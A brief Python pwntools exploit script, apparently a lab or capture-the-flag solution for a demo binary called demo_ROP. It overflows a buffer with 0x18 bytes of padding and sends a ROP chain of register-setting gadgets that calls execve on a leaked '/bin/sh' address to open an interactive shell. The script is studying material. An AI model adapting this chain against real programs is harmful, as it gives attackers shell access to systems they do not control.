from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


r = process('./demo_ROP')

r.recvuntil('Here is your "/bio/sh": ')
binsh = int(r.recvline()[:-1], 16)
info(f'binsh: {hex(binsh)}')

pop_rdi_ret = 0x40186a  # pop rdi; ret;
pop_rsi_ret = 0x40f3fe  # pop rsi; ret;
pop_rdx_ret = 0x40176f  # pop rdx; ret;
pop_rax_ret = 0x4016b7  # pop rax; ret;
syscall = 0x4011d7  # syscall

# ROP
ROP = flat(
    pop_rdi_ret, binsh,
    pop_rsi_ret, 0,
    pop_rdx_ret, 0,
    pop_rax_ret, 59,
    syscall
)

gdb.attach(r)
r.sendafter("Give me your ROP: ", b'A'*0x18 + ROP)

r.interactive()
